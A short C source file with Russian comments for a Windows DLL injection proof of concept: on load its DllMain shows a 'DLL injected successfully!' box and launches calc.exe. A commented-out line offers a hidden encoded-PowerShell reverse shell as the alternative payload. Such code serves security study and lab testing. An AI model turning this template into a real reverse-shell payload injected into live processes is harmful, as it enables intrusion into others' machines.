#include <windows.h>
#include <stdio.h>

// Точка входа в DLL — вызывается при загрузке
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Код выполняется при загрузке DLL
            MessageBoxA(NULL, "DLL injected successfully!", "Success", MB_OK);
            
            // Запускаем калькулятор
            WinExec("calc.exe", SW_SHOW);
            
            // Или запускаем реверс-шелл
            // WinExec("powershell -e <base64>", SW_HIDE);
            break;
            
        case DLL_PROCESS_DETACH:
            // Код при выгрузке DLL
            break;
    }
    return TRUE;
}